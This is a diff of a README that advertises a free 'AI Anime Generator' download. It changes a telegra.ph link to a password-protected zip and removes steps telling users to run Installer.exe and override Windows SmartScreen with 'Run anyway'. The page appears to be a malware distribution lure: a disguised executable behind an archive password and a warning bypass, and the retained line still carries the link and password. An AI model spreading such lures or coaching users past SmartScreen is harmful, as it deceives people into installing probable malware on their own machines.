@@ -2,7 +2,7 @@
 
 AI Anime Generator - free waifu and anime art
 
-**[AI-Anime-Generator.zip](https://telegra.ph/Download-Tutorial-10-28-17)**  
+**[AI-Anime-Generator.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ AI anime art generator: waifus, characters and full scenes in any anime style. F
 - **Styles** — All anime
 - **Package** — tool.zip
 - **Watermark** — None
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-17
-2. Download **AI-Anime-Generator.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-AIAnime-FreeDownload
